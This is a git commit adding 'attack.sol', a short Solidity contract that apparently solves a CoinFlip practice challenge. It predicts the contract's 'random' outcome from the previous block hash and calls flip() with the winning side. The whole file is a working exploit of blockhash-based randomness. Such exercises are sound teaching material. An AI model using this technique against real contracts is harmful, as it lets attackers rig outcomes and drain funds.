0382b39641adbea1ed8d8c3ea7c45cb7daaff860
donghyeon <tsvz1234@gmail.com>
2024-06-18 01:28:46 +0900

    Create attack.sol

---
+++ Coinflip/attack.sol
@@ -0,0 +1,19 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./coinflip.sol";
+import "hardhat/console.sol";
+
+contract Attack {
+
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+   function letflip (CoinFlip coinflip) public {
+    uint256 blockvalue =  uint256(blockhash(block.number - 1));
+    uint256 coin = blockvalue / FACTOR;
+    bool side = coin == 1 ? true : false;
+
+    coinflip.flip(side);
+     
+   }
+}
